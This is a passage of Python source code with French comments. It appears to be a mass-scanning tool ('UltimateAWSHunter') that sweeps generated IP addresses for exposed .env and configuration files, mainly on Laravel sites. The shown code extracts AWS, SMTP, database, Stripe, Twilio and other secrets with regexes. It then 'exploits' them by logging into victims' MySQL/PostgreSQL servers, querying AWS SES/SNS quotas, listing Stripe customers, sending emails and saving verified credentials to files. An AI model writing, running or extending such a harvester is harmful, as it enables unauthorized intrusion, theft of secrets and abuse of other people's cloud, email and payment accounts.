                ],
                'priority': 7
            },
            'facebook': {
                'patterns': [
                    (r'FACEBOOK_APP_ID\s*=\s*["\']?(\d{15,16})["\']?', 'FACEBOOK_APP_ID'),
                    (r'FACEBOOK_APP_SECRET\s*=\s*["\']?([a-f0-9]{32})["\']?', 'FACEBOOK_APP_SECRET'),
                    (r'FB_APP_ID\s*=\s*["\']?(\d{15,16})["\']?', 'FB_APP_ID'),
                    (r'FB_APP_SECRET\s*=\s*["\']?([a-f0-9]{32})["\']?', 'FB_APP_SECRET'),
                ],
                'priority': 6
            },
            'github': {
                'patterns': [
                    (r'GITHUB_TOKEN\s*=\s*["\']?(ghp_[A-Za-z0-9]{36})["\']?', 'GITHUB_TOKEN'),
                    (r'GITHUB_CLIENT_ID\s*=\s*["\']?([A-Za-z0-9]{20})["\']?', 'GITHUB_CLIENT_ID'),
                    (r'GITHUB_CLIENT_SECRET\s*=\s*["\']?([A-Za-z0-9]{40})["\']?', 'GITHUB_CLIENT_SECRET'),
                ],
                'priority': 7
            },
            'slack': {
                'patterns': [
                    (r'SLACK_TOKEN\s*=\s*["\']?(xox[baprs]-[A-Za-z0-9\-]+)["\']?', 'SLACK_TOKEN'),
                    (r'SLACK_WEBHOOK\s*=\s*["\']?(https://hooks\.slack\.com/services/[A-Za-z0-9/]+)["\']?', 'SLACK_WEBHOOK'),
                    (r'SLACK_BOT_TOKEN\s*=\s*["\']?(xoxb-[A-Za-z0-9\-]+)["\']?', 'SLACK_BOT_TOKEN'),
                ],
                'priority': 6
            },
            'discord': {
                'patterns': [
                    (r'DISCORD_TOKEN\s*=\s*["\']?([A-Za-z0-9]{24}\.[A-Za-z0-9]{6}\.[A-Za-z0-9_\-]{27})["\']?', 'DISCORD_TOKEN'),
                    (r'DISCORD_WEBHOOK\s*=\s*["\']?(https://discord(?:app)?\.com/api/webhooks/[A-Za-z0-9/]+)["\']?', 'DISCORD_WEBHOOK'),
                ],
                'priority': 6
            }
        }
        
    def extract_credentials(self, content):
        """🔍 Extraction complète des credentials"""
        found_credentials = {}
        
        for category, config in self.extraction_patterns.items():
            found_credentials[category] = {}
            
            for pattern, key_name in config['patterns']:
                try:
                    matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
                    if matches:
                        # Prendre la première occurrence
                        value = matches[0] if isinstance(matches[0], str) else matches[0]
                        
                        # Nettoyer la valeur
                        value = str(value).strip().strip('"\'')
                        
                        # Valider que ce n'est pas une valeur par défaut
                        if (value and 
                            value.lower() not in ['null', 'none', '', 'false', 'true', 'your_key_here', 'example', 'test'] and
                            len(value) > 3):
                            found_credentials[category][key_name] = value
                            
                except Exception as e:
                    continue
                    
        # Nettoyer les catégories vides
        found_credentials = {k: v for k, v in found_credentials.items() if v}
        
        return found_credentials


class DatabaseValidator:
    """🗄️ Validateur de bases de données complet"""
    
    def __init__(self):
        self.tested_connections = set()
        
    def test_mysql_connection(self, credentials):
        """🔍 Test connexion MySQL/MariaDB"""
        if not MYSQL_AVAILABLE:
            return False, "mysql-connector-python not available"
            
        try:
            host = credentials.get('DB_HOST', 'localhost')
            port = int(credentials.get('DB_PORT', 3306))
            database = credentials.get('DB_DATABASE', '')
            username = credentials.get('DB_USERNAME', '')
            password = credentials.get('DB_PASSWORD', '')
            
            if not all([host, username]):
                return False, "Missing required credentials"
                
            connection_key = f"mysql://{username}@{host}:{port}/{database}"
            if connection_key in self.tested_connections:
                return False, "Already tested"
                
            self.tested_connections.add(connection_key)
            
            import mysql.connector
            connection = mysql.connector.connect(
                host=host,
                port=port,
                database=database,
                user=username,
                password=password,
                connection_timeout=5,
                autocommit=True
            )
            
            cursor = connection.cursor()
            cursor.execute("SELECT VERSION()")
            version = cursor.fetchone()[0]
            
            cursor.execute("SHOW DATABASES")
            databases = [db[0] for db in cursor.fetchall()]
            
            cursor.close()
            connection.close()
            
            return True, {
                'type': 'mysql',
                'version': version,
                'databases': databases[:10],  # Limiter pour éviter le spam
                'host': host,
                'port': port,
                'username': username
            }
            
        except Exception as e:
            return False, str(e)
            
    def test_postgresql_connection(self, credentials):
        """🔍 Test connexion PostgreSQL"""
        if not POSTGRES_AVAILABLE:
            return False, "psycopg2 not available"
            
        try:
            host = credentials.get('POSTGRES_HOST', credentials.get('DB_HOST', 'localhost'))
            port = int(credentials.get('POSTGRES_PORT', credentials.get('DB_PORT', 5432)))
            database = credentials.get('POSTGRES_DB', credentials.get('DB_DATABASE', 'postgres'))
            username = credentials.get('POSTGRES_USER', credentials.get('DB_USERNAME', ''))
            password = credentials.get('POSTGRES_PASSWORD', credentials.get('DB_PASSWORD', ''))
            
            if not all([host, username]):
                return False, "Missing required credentials"
                
            connection_key = f"postgresql://{username}@{host}:{port}/{database}"
            if connection_key in self.tested_connections:
                return False, "Already tested"
                
            self.tested_connections.add(connection_key)
            
            import psycopg2
            connection = psycopg2.connect(
                host=host,
                port=port,
                database=database,
                user=username,
                password=password,
                connect_timeout=5
            )
            
            cursor = connection.cursor()
            cursor.execute("SELECT version()")
            version = cursor.fetchone()[0]
            
            cursor.execute("SELECT datname FROM pg_database WHERE datistemplate = false")
            databases = [db[0] for db in cursor.fetchall()]
            
            cursor.close()
            connection.close()
            
            return True, {
                'type': 'postgresql',
                'version': version,
                'databases': databases[:10],
                'host': host,
                'port': port,
                'username': username
            }
            
        except Exception as e:
            return False, str(e)
            
    def test_database_credentials(self, credentials):
        """🔍 Test complet des credentials de base de données"""
        results = []
        
        # Détecter le type de base de données
        db_type = credentials.get('DB_CONNECTION', '').lower()
        
        if db_type in ['mysql', 'mariadb'] or any(k.startswith('DB_') for k in credentials.keys()):
            is_valid, info = self.test_mysql_connection(credentials)
            if is_valid:
                results.append(('mysql', info))
                
        if db_type == 'pgsql' or any(k.startswith('POSTGRES_') for k in credentials.keys()):
            is_valid, info = self.test_postgresql_connection(credentials)
            if is_valid:
                results.append(('postgresql', info))
                
        return results


class APIValidator:
    """🔗 Validateur d'APIs complet"""
    
    def __init__(self):
        self.tested_apis = set()
        
    def test_twilio_api(self, credentials):
        """📱 Test API Twilio"""
        if not TWILIO_AVAILABLE:
            return False, "twilio not available"
            
        try:
            account_sid = (credentials.get('TWILIO_ACCOUNT_SID') or 
                          credentials.get('TWILIO_SID') or 
                          credentials.get('ACCOUNT_SID'))
            auth_token = (credentials.get('TWILIO_AUTH_TOKEN') or 
                         credentials.get('TWILIO_TOKEN') or 
                         credentials.get('AUTH_TOKEN'))
            
            if not account_sid or not auth_token:
                return False, "Missing SID or token"
                
            api_key = f"{account_sid}:{auth_token}"
            if api_key in self.tested_apis:
                return False, "Already tested"
                
            self.tested_apis.add(api_key)
            
            client = TwilioClient(account_sid, auth_token)
            
            # Test avec timeout
            account = client.api.accounts(account_sid).fetch()
            
            # Obtenir les numéros disponibles
            numbers = list(client.incoming_phone_numbers.list(limit=5))
            
            return True, {
                'type': 'twilio',
                'account_sid': account_sid,
                'account_status': account.status,
                'numbers_count': len(numbers),
                'numbers': [num.phone_number for num in numbers],
                'balance': 'Unknown'  # Twilio ne fournit plus le solde via API basique
            }
            
        except Exception as e:
            return False, str(e)
            
    def test_stripe_api(self, credentials):
        """💳 Test API Stripe"""
        if not STRIPE_AVAILABLE:
            return False, "stripe not available"
            
        try:
            secret_key = (credentials.get('STRIPE_SECRET_KEY') or 
                         credentials.get('STRIPE_KEY') or 
                         credentials.get('STRIPE_PRIVATE_KEY'))
            
            if not secret_key or not secret_key.startswith('sk_'):
                return False, "Missing or invalid secret key"
                
            if secret_key in self.tested_apis:
                return False, "Already tested"
                
            self.tested_apis.add(secret_key)
            
            stripe_api.api_key = secret_key
            
            # Test avec récupération du compte
            account = stripe_api.Account.retrieve()
            
            # Obtenir quelques customers (limité)
            customers = stripe_api.Customer.list(limit=3)
            
            return True, {
                'type': 'stripe',
                'account_id': account.id,
                'country': account.country,
                'currency': account.default_currency,
                'charges_enabled': account.charges_enabled,
                'payouts_enabled': account.payouts_enabled,
                'customers_count': len(customers.data)
            }
            
        except Exception as e:
            return False, str(e)
            
    def test_sendgrid_api(self, credentials):
        """📧 Test API SendGrid"""
        try:
            api_key = (credentials.get('SENDGRID_API_KEY') or 
                      credentials.get('SENDGRID_KEY') or 
                      credentials.get('SG_KEY'))
            
            if not api_key or not api_key.startswith('SG.'):
                return False, "Missing or invalid API key"
                
            if api_key in self.tested_apis:
                return False, "Already tested"
                
            self.tested_apis.add(api_key)
            
            headers = {
                'Authorization': f'Bearer {api_key}',
                'Content-Type': 'application/json'
            }
            
            # Test quota
            response = requests.get(
                'https://api.sendgrid.com/v3/user/credits',
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                quota_data = response.json()
                
                # Test profil utilisateur
                profile_response = requests.get(
                    'https://api.sendgrid.com/v3/user/profile',
                    headers=headers,
                    timeout=10
                )
                
                profile_data = profile_response.json() if profile_response.status_code == 200 else {}
                
                return True, {
                    'type': 'sendgrid',
                    'credits': quota_data.get('remain', 0),
                    'total_credits': quota_data.get('total', 0),
                    'username': profile_data.get('username', 'Unknown'),
                    'email': profile_data.get('email', 'Unknown')
                }
            else:
                return False, f"API returned {response.status_code}"
                
        except Exception as e:
            return False, str(e)
            
    def test_mailgun_api(self, credentials):
        """📧 Test API Mailgun"""
        try:
            api_key = (credentials.get('MAILGUN_SECRET') or 
                      credentials.get('MAILGUN_API_KEY'))
            domain = credentials.get('MAILGUN_DOMAIN')
            
            if not api_key or not api_key.startswith('key-'):
                return False, "Missing or invalid API key"
                
            if not domain:
                return False, "Missing domain"
                
            test_key = f"{api_key}:{domain}"
            if test_key in self.tested_apis:
                return False, "Already tested"
                
            self.tested_apis.add(test_key)
            
            # Test avec les stats du domaine
            response = requests.get(
                f'https://api.mailgun.net/v3/{domain}/stats/total',
                auth=('api', api_key),
                timeout=10
            )
            
            if response.status_code == 200:
                stats = response.json()
                
                return True, {
                    'type': 'mailgun',
                    'domain': domain,
                    'stats': stats.get('stats', []),
                    'delivered': stats.get('stats', [{}])[0].get('delivered', {}).get('total', 0) if stats.get('stats') else 0
                }
            else:
                return False, f"API returned {response.status_code}"
                
        except Exception as e:
            return False, str(e)


class EnhancedLaravelDetector:
    """🔥 Détecteur Laravel ultra-avancé"""
    
    def __init__(self):
        self.laravel_file = "laravel_ips_found.txt"
        self.laravel_count = 0
        self.laravel_ips_found = set()
        self.lock = Lock()
        
        # Signatures Laravel avancées
        self.laravel_signatures = {
            'headers': [
                'laravel_session',
                'x-powered-by: php',
                'set-cookie: laravel_session',
                'x-ratelimit-limit',
                'x-ratelimit-remaining'
            ],
            'content': [
                'laravel',
                'illuminate',
                'csrf-token',
                '_token',
                'app.blade.php',
                'resources/views',
                'bootstrap/app.php',
                'artisan',
                'composer.json',
                'laravel/framework'
            ],
            'paths': [
                '.env',
                '.env.example',
                '.env.backup',
                '.env.old',
                '.env.save',
                'artisan',
                'bootstrap/app.php',
                'storage/logs/laravel.log',
                'config/app.php',
                'routes/web.php'
            ],
            'errors': [
                'laravel',
                'illuminate',
                'whoops',
                'symfony/debug',
                'stack trace'
            ]
        }
        
    def detect_laravel_comprehensive(self, ip, port, session):
        """🔥 Détection Laravel ultra-complète"""
        base_url = f"http://{ip}" if port == 80 else f"https://{ip}"
        
        try:
            # Test page principale
            response = session.get(base_url, timeout=3)
            headers = dict(response.headers)
            content = response.text[:3000].lower()
            
            # Score de détection
            laravel_score = 0
            detection_details = []
            
            # Check headers
            for header_sign in self.laravel_signatures['headers']:
                if ':' in header_sign:
                    h_name, h_value = header_sign.split(':', 1)
                    for h_key, h_val in headers.items():
                        if h_key.lower() == h_name.lower() and h_value.strip().lower() in str(h_val).lower():
                            laravel_score += 3
                            detection_details.append(f"Header: {header_sign}")
                else:
                    if any(header_sign.lower() in str(h).lower() for h in headers.values()):
                        laravel_score += 2
                        detection_details.append(f"Header: {header_sign}")
                        
            # Check content
            for content_sign in self.laravel_signatures['content']:
                if content_sign.lower() in content:
                    laravel_score += 2
                    detection_details.append(f"Content: {content_sign}")
                    
            # Test erreur pour détecter Laravel
            try:
                error_response = session.get(f"{base_url}/non-existent-route-12345", timeout=2)
                error_content = error_response.text[:2000].lower()
                
                for error_sign in self.laravel_signatures['errors']:
                    if error_sign.lower() in error_content:
                        laravel_score += 3
                        detection_details.append(f"Error page: {error_sign}")
                        
            except:
                pass
                
            if laravel_score < 3:
                return None
                
            # Test .env exposure
            env_exposed = False
            env_content = ""
            
            for env_path in ['.env', 'api/.env', 'config/.env', 'backend/.env']:
                try:
                    env_resp = session.get(f"{base_url}/{env_path}", timeout=2)
                    if env_resp.status_code == 200 and ('APP_KEY=' in env_resp.text or 'DB_PASSWORD=' in env_resp.text):
                        env_exposed = True
                        env_content = env_resp.text[:5000]  # Limité
                        detection_details.append(f"ENV exposed: {env_path}")
                        break
                except:
                    continue
                    
            laravel_info = {
                'ip': ip,
                'port': port,
                'url': base_url,
                'env_exposed': env_exposed,
                'env_path': env_path if env_exposed else None,
                'env_content': env_content if env_exposed else None,
                'score': laravel_score,
                'detection_details': detection_details,
                'timestamp': datetime.now().isoformat()
            }
            
            return laravel_info
            
        except Exception as e:
            return None
            
    def save_laravel_comprehensive(self, laravel_info):
        """💾 Sauvegarde Laravel complète"""
        ip_line = f"{laravel_info['ip']}:{laravel_info['port']}"
        
        with self.lock:
            if ip_line not in self.laravel_ips_found:
                self.laravel_ips_found.add(ip_line)
                self.laravel_count += 1
                
                # Sauvegarde ligne par ligne
                with open(self.laravel_file, 'a', encoding='utf-8') as f:
                    f.write(f"{ip_line}\n")
                    f.flush()
                    
                # Sauvegarde détaillée si .env exposé
                if laravel_info['env_exposed']:
                    with open('laravel_detailed.txt', 'a', encoding='utf-8') as f:
                        f.write(f"\n{'='*80}\n")
                        f.write(f"Laravel with .env: {ip_line}\n")
                        f.write(f"Score: {laravel_info['score']}\n")
                        f.write(f"Detection: {', '.join(laravel_info['detection_details'])}\n")
                        f.write(f"ENV Path: {laravel_info['env_path']}\n")
                        f.write(f"Timestamp: {laravel_info['timestamp']}\n")
                        if laravel_info['env_content']:
                            f.write(f"\nENV Content:\n{laravel_info['env_content'][:2000]}\n")
                        f.write(f"{'='*80}\n")
                        f.flush()
                        
                print(f"[LARAVEL] 📝 {ip_line} (score: {laravel_info['score']}, env: {laravel_info['env_exposed']})")


class UltimateAWSHunter:
    """🚀 Hunter principal avec toutes les fonctionnalités avancées"""
    
    def __init__(self, mode='hybrid', threads=1000, test_email="test@example.com", debug=False):
        self.mode = mode
        self.threads = threads
        self.test_email = test_email
        self.debug = debug
        
        # Initialisation des composants
        self.logger = setup_advanced_logging(
            level=logging.DEBUG if debug else logging.INFO
        )
        self.performance_monitor = PerformanceMonitor()
        self.delay_manager = AdaptiveDelayManager()
        self.session_manager = AsyncSessionManager()
        self.ip_generator = AdvancedIPGenerator(mode=mode)
        self.framework_detector = ComprehensiveFrameworkDetector()
        self.credential_extractor = UltimateCredentialExtractor()
        self.database_validator = DatabaseValidator()
        self.api_validator = APIValidator()
        self.laravel_detector = EnhancedLaravelDetector()
        
        # Queues avec tailles adaptatives
        queue_size_multiplier = max(1, threads // 500)
        self.ip_queue = queue.Queue(maxsize=10000 * queue_size_multiplier)
        self.vuln_queue = queue.Queue(maxsize=5000 * queue_size_multiplier)
        self.validate_queue = queue.Queue(maxsize=2000 * queue_size_multiplier)
        
        # Fichiers de sortie
        self.output_files = {
            'valid_ips': 'valid_ips.txt',
            'aws_credentials': 'aws_credentials_verified.txt',
            'smtp_credentials': 'smtp_credentials_verified.txt',
            'database_credentials': 'database_credentials_verified.txt',
            'api_credentials': 'api_credentials_verified.txt',
            'laravel_ips': self.laravel_detector.laravel_file,
            'vulnerability_details': 'vulnerability_details.txt',
            'exploitation_log': 'exploitation_log.txt'
        }
        
        # Paths de fuzzing complets
        self.fuzzing_paths = [
            # ENV files
            '.env', '.env.backup', '.env.old', '.env.save', '.env.prod',
            '.env.production', '.env.dev', '.env.development', '.env.local',
            '.env.example', '.env.sample', '.env.template', '.env.dist',
            '.env.bak', '.env.swp', '.env~', '.environment',
            
            # Specific paths
            'api/.env', 'app/.env', 'config/.env', 'backend/.env',
            'frontend/.env', 'public/.env', 'storage/.env', 'assets/.env',
            'www/.env', 'html/.env', 'web/.env', 'site/.env',
            'admin/.env', 'panel/.env', 'dashboard/.env', 'cp/.env',
            'private/.env', 'secure/.env', 'protected/.env', 'internal/.env',
            
            # Configuration files
            'config/database.php', 'config/mail.php', 'config/services.php',
            'application.properties', 'application.yml', 'application.yaml',
            'web.config', 'wp-config.php', 'settings.py', 'local_settings.py',
            'config.php', 'config.inc.php', 'configuration.php',
            
            # Debug/Info endpoints
            'phpinfo.php', 'info.php', 'test.php', 'debug.php',
            'server-info', 'server-status', '_profiler', 'debug/default/view'
        ]
        
        # Statistiques ultra-complètes
        self.stats = {
            'start_time': time.time(),
            'generated': 0,
            'checked': 0,
            'valid': 0,
            'vulnerable': 0,
            'exploited': 0,
            
            # Frameworks
            'laravel_found': 0,
            'frameworks_detected': defaultdict(int),
            
            # AWS
            'aws_found': 0,
            'aws_working': 0,
            'aws_ses_ready': 0,
            'aws_sms_ready': 0,
            
            # SMTP
            'smtp_found': 0,
            'smtp_working': 0,
            'emails_sent': 0,
            'smtp_types': defaultdict(int),
            'smtp_working_types': defaultdict(int),
            
            # Database
            'database_found': 0,
            'database_working': 0,
            'mysql_working': 0,
            'postgresql_working': 0,
            
            # APIs
            'api_found': 0,
            'api_working': 0,
            'twilio_working': 0,
            'stripe_working': 0,
            'sendgrid_working': 0,
            'mailgun_working': 0,
            
            # System
            'threads_active': 0,
            'queue_sizes': {},
            'memory_usage': 0,
            'cpu_usage': 0,
            
            # Performance
            'avg_response_time': 0,
            'success_rate': 0,
            'adaptive_delay': 0,
            
            # Credentials types
            'credentials_found': defaultdict(int),
            'exploitation_attempts': defaultdict(int),
            'exploitation_success': defaultdict(int)
        }
        
        self.running = True
        self.main_lock = Lock()
        
        # Workers tracking
        self.workers = []
        self.worker_stats = defaultdict(int)
        
        self._init_output_files()
        
    def _init_output_files(self):
        """📁 Initialisation des fichiers de sortie"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        headers = {
            'valid_ips': "# Valid IPs Found",
            'aws_credentials': "# AWS Credentials Verified + Complete Analysis",
            'smtp_credentials': "# SMTP Credentials Verified + Live Email Tests",
            'database_credentials': "# Database Credentials Verified + Connection Tests",
            'api_credentials': "# API Credentials Verified + API Tests",
            'laravel_ips': "# Laravel IPs Found (Line by Line)",
            'vulnerability_details': "# Vulnerability Details + Exploitation",
            'exploitation_log': "# Real-time Exploitation Log"
        }
        
        for file_key, filename in self.output_files.items():
            try:
                with open(filename, 'a', encoding='utf-8') as f:
                    header = headers.get(file_key, f"# {file_key.replace('_', ' ').title()}")
                    f.write(f"{header} - {timestamp}\n")
                    f.write(f"# Mode: {self.mode} | Threads: {self.threads} | Email: {self.test_email}\n")
                    f.write("="*100 + "\n")
            except Exception as e:
                self.logger.error(f"Error initializing {filename}: {e}")
                
        self.logger.info("✅ Output files initialized")

    def check_ip_ultra_fast(self, ip, port=80):
        """⚡ Check IP ultra-rapide avec métriques"""
        start_time = time.time()
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(0.2)  # 200ms max
        
        try:
            result = sock.connect_ex((ip, port))
            is_open = result == 0
            
            # Update performance metrics
            response_time = time.time() - start_time
            self.delay_manager.update_success_rate(is_open)
            
            return is_open
        except Exception as e:
            return False
        finally:
            sock.close()

    async def check_vulnerability_async(self, ip, port, session):
        """🔍 Check vulnérabilité asynchrone ultra-complet"""
        if not session:
            return await self.check_vulnerability_sync_fallback(ip, port)
            
        base_url = f"http://{ip}" if port == 80 else f"https://{ip}"
        
        results = {
            'vulnerabilities': [],
            'credentials': {},
            'frameworks': [],
            'laravel_info': None,
            'exploited': [],
            'response_time': 0,
            'errors': []
        }
        
        start_time = time.time()
        
        try:
            # 1. Test connexion principale
            async with session.get(base_url) as response:
                if response.status != 200:
                    return results
                    
                content = await response.text()
                headers = dict(response.headers)
                
                # 2. Détection de frameworks
                frameworks = await self.framework_detector.detect_framework_async(ip, port, session)
                results['frameworks'] = frameworks
                
                if frameworks:
                    for fw in frameworks:
                        self.stats['frameworks_detected'][fw] += 1
                        
                # 3. Détection Laravel spécifique
                if 'laravel' in frameworks or any(sign in content.lower() for sign in ['laravel', 'csrf-token']):
                    laravel_info = self.laravel_detector.detect_laravel_comprehensive(ip, port, self.session_manager.get_session())
                    if laravel_info:
                        results['laravel_info'] = laravel_info
                        self.laravel_detector.save_laravel_comprehensive(laravel_info)
                        self.stats['laravel_found'] += 1
                        
                # 4. Fuzzing des paths critiques
                for path in self.fuzzing_paths[:10]:  # Limiter en async pour perf
                    try:
                        async with session.get(f"{base_url}/{path}") as path_response:
                            if path_response.status == 200:
                                path_content = await path_response.text()
                                
                                # Check si contient des credentials
                                if any(indicator in path_content.upper() for indicator in 
                                      ['AWS_ACCESS_KEY_ID', 'MAIL_HOST', 'SENDGRID_API_KEY', 'DB_PASSWORD']):
                                    
                                    results['vulnerabilities'].append(path)
                                    
                                    # Extraction des credentials
                                    creds = self.credential_extractor.extract_credentials(path_content)
                                    if creds:
                                        results['credentials'].update(creds)
                                        
                                        # Exploitation immédiate
                                        exploited = await self.exploit_credentials_async(ip, port, creds)
                                        results['exploited'].extend(exploited)
                                        
                                        if self.debug:
                                            self.logger.debug(f"Found credentials at {ip}:{port}/{path}: {list(creds.keys())}")
                                        
                                        break  # Premier .env trouvé suffit
                                        
                    except asyncio.TimeoutError:
                        continue
                    except Exception as e:
                        results['errors'].append(f"{path}: {str(e)}")
                        continue
                        
        except Exception as e:
            results['errors'].append(f"Main check: {str(e)}")
            
        results['response_time'] = time.time() - start_time
        return results

    async def check_vulnerability_sync_fallback(self, ip, port):
        """🔍 Fallback sync pour check vulnérabilité"""
        session = self.session_manager.get_session()
        
        try:
            results = self.check_vulnerability_sync(ip, port, session)
            return results
        finally:
            self.session_manager.return_session(session)

    def check_vulnerability_sync(self, ip, port, session):
        """🔍 Check vulnérabilité synchrone ultra-complet"""
        base_url = f"http://{ip}" if port == 80 else f"https://{ip}"
        
        results = {
            'vulnerabilities': [],
            'credentials': {},
            'frameworks': [],
            'laravel_info': None,
            'exploited': [],
            'response_time': 0,
            'errors': []
        }
        
        start_time = time.time()
        
        try:
            # 1. Test connexion principale
            response = session.get(base_url)
            if response.status_code != 200:
                return results
                
            content = response.text
            headers = dict(response.headers)
            
            # 2. Détection de frameworks
            frameworks = self.framework_detector.detect_framework_sync(ip, port, session)
            results['frameworks'] = frameworks
            
            if frameworks:
                for fw in frameworks:
                    self.stats['frameworks_detected'][fw] += 1
                    
            # 3. Détection Laravel spécifique
            if 'laravel' in frameworks or any(sign in content.lower() for sign in ['laravel', 'csrf-token']):
                laravel_info = self.laravel_detector.detect_laravel_comprehensive(ip, port, session)
                if laravel_info:
                    results['laravel_info'] = laravel_info
                    self.laravel_detector.save_laravel_comprehensive(laravel_info)
                    self.stats['laravel_found'] += 1
                    
            # 4. Fuzzing des paths critiques
            for path in self.fuzzing_paths:
                try:
                    path_response = session.get(f"{base_url}/{path}", timeout=2)
                    
                    if path_response.status_code == 200:
                        path_content = path_response.text
                        
                        # Check si contient des credentials
                        if any(indicator in path_content.upper() for indicator in 
                              ['AWS_ACCESS_KEY_ID', 'MAIL_HOST', 'SENDGRID_API_KEY', 'DB_PASSWORD', 'STRIPE_SECRET']):
                            
                            results['vulnerabilities'].append(path)
                            
                            # Extraction des credentials
                            creds = self.credential_extractor.extract_credentials(path_content)
                            if creds:
                                results['credentials'].update(creds)
                                
                                # Exploitation immédiate
                                exploited = self.exploit_credentials_sync(ip, port, creds)
                                results['exploited'].extend(exploited)
                                
                                if self.debug:
                                    self.logger.debug(f"Found credentials at {ip}:{port}/{path}: {list(creds.keys())}")
                                
                                break  # Premier .env trouvé suffit
                                
                except Exception as e:
                    results['errors'].append(f"{path}: {str(e)}")
                    continue
                    
        except Exception as e:
            results['errors'].append(f"Main check: {str(e)}")
            
        results['response_time'] = time.time() - start_time
        return results

    async def exploit_credentials_async(self, ip, port, credentials):
        """🔥 Exploitation asynchrone des credentials"""
        exploited = []
        
        for cred_type, creds in credentials.items():
            if not creds:
                continue
                
            self.stats['credentials_found'][cred_type] += 1
            self.stats['exploitation_attempts'][cred_type] += 1
            
            try:
                if cred_type == 'aws':
                    success = await self.exploit_aws_credentials_async(ip, port, creds)
                    if success:
                        exploited.append('AWS')
                        self.stats['exploitation_success']['aws'] += 1
                        
                elif cred_type in ['smtp', 'sendgrid', 'mailgun']:
                    success = await self.exploit_smtp_credentials_async(ip, port, creds, cred_type)
                    if success:
                        exploited.append(cred_type.upper())
                        self.stats['exploitation_success'][cred_type] += 1
                        
                elif cred_type == 'database':
                    success = await self.exploit_database_credentials_async(ip, port, creds)
                    if success:
                        exploited.append('DATABASE')
                        self.stats['exploitation_success']['database'] += 1
                        
                elif cred_type in ['twilio', 'stripe']:
                    success = await self.exploit_api_credentials_async(ip, port, creds, cred_type)
                    if success:
                        exploited.append(cred_type.upper())
                        self.stats['exploitation_success'][cred_type] += 1
                        
            except Exception as e:
                if self.debug:
                    self.logger.error(f"Exploitation error for {cred_type}: {e}")
                    
        return exploited

    def exploit_credentials_sync(self, ip, port, credentials):
        """🔥 Exploitation synchrone des credentials"""
        exploited = []
        
        for cred_type, creds in credentials.items():
            if not creds:
                continue
                
            self.stats['credentials_found'][cred_type] += 1
            self.stats['exploitation_attempts'][cred_type] += 1
            
            try:
                if cred_type == 'aws':
                    success = self.exploit_aws_credentials_sync(ip, port, creds)
                    if success:
                        exploited.append('AWS')
                        self.stats['exploitation_success']['aws'] += 1
                        
                elif cred_type in ['smtp', 'sendgrid', 'mailgun']:
                    success = self.exploit_smtp_credentials_sync(ip, port, creds, cred_type)
                    if success:
                        exploited.append(cred_type.upper())
                        self.stats['exploitation_success'][cred_type] += 1
                        
                elif cred_type == 'database':
                    success = self.exploit_database_credentials_sync(ip, port, creds)
                    if success:
                        exploited.append('DATABASE')
                        self.stats['exploitation_success']['database'] += 1
                        
                elif cred_type in ['twilio', 'stripe']:
                    success = self.exploit_api_credentials_sync(ip, port, creds, cred_type)
                    if success:
                        exploited.append(cred_type.upper())
                        self.stats['exploitation_success'][cred_type] += 1
                        
            except Exception as e:
                if self.debug:
                    self.logger.error(f"Exploitation error for {cred_type}: {e}")
                    
        return exploited

    async def exploit_aws_credentials_async(self, ip, port, creds):
        """☁️ Exploitation AWS async"""
        # Pour l'instant, déléguer au sync car boto3 n'est pas async
        return self.exploit_aws_credentials_sync(ip, port, creds)

    def exploit_aws_credentials_sync(self, ip, port, creds):
        """☁️ Exploitation AWS sync"""
        if not BOTO3_AVAILABLE:
            return False
            
        try:
            access_key = (creds.get('AWS_ACCESS_KEY_ID') or 
                         creds.get('AWS_KEY') or 
                         creds.get('SES_KEY'))
            secret_key = (creds.get('AWS_SECRET_ACCESS_KEY') or 
                         creds.get('AWS_SECRET') or 
                         creds.get('SES_SECRET'))
            region = creds.get('AWS_DEFAULT_REGION', 'us-east-1')
            
            if not access_key or not secret_key:
                return False
                
            # Test rapide avec STS
            sts = boto3.client(
                'sts',
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key,
                region_name=region,
                config=boto3.session.Config(
                    connect_timeout=3,
                    read_timeout=5,
                    retries={'max_attempts': 1}
                )
            )
            
            identity = sts.get_caller_identity()
            
            if identity:
                self.stats['aws_found'] += 1
                
                # Test SES
                try:
                    ses = boto3.client('ses', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region,
                                     config=boto3.session.Config(connect_timeout=3, read_timeout=5, retries={'max_attempts': 1}))
                    quota = ses.get_send_quota()
                    if quota.get('Max24HourSend', 0) > 0:
                        self.stats['aws_ses_ready'] += 1
                except:
                    pass
                    
                # Test SNS
                try:
                    sns = boto3.client('sns', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region,
                                     config=boto3.session.Config(connect_timeout=3, read_timeout=5, retries={'max_attempts': 1}))
                    sms_attrs = sns.get_sms_attributes()
                    if sms_attrs.get('Attributes', {}).get('MonthlySpendLimit', '0') != '0':
                        self.stats['aws_sms_ready'] += 1
                except:
                    pass
                    
                self.stats['aws_working'] += 1
                
                # Sauvegarde immédiate
                self.save_aws_credentials(ip, port, creds, identity)
                
                return True
                
        except Exception as e:
            if self.debug:
                self.logger.error(f"AWS exploitation error: {e}")
                
        return False

    async def exploit_smtp_credentials_async(self, ip, port, creds, smtp_type):
        """📧 Exploitation SMTP async"""
        # SMTP est généralement sync, déléguer
        return self.exploit_smtp_credentials_sync(ip, port, creds, smtp_type)

    def exploit_smtp_credentials_sync(self, ip, port, creds, smtp_type):
        """📧 Exploitation SMTP sync"""
        try:
            # Préparer la configuration SMTP
            smtp_config = self.prepare_smtp_config(smtp_type, creds)
            if not smtp_config:
                return False
                
            # Test SMTP
            success, result = self.test_smtp_connection(smtp_config)
            
            if success:
                self.stats['smtp_found'] += 1
                self.stats['smtp_types'][smtp_type] += 1
                
                # Test envoi d'email
                email_sent = self.send_test_email(smtp_config, ip)
                if email_sent:
                    self.stats['emails_sent'] += 1
                    self.stats['smtp_working'] += 1
                    self.stats['smtp_working_types'][smtp_type] += 1
                    
                # Sauvegarde
                self.save_smtp_credentials(ip, port, creds, smtp_type, result, email_sent)
                
                return True
                
        except Exception as e:
            if self.debug:
                self.logger.error(f"SMTP exploitation error: {e}")
                
        return False

    async def exploit_database_credentials_async(self, ip, port, creds):
        """🗄️ Exploitation Database async"""
        # Database connections sont sync, déléguer
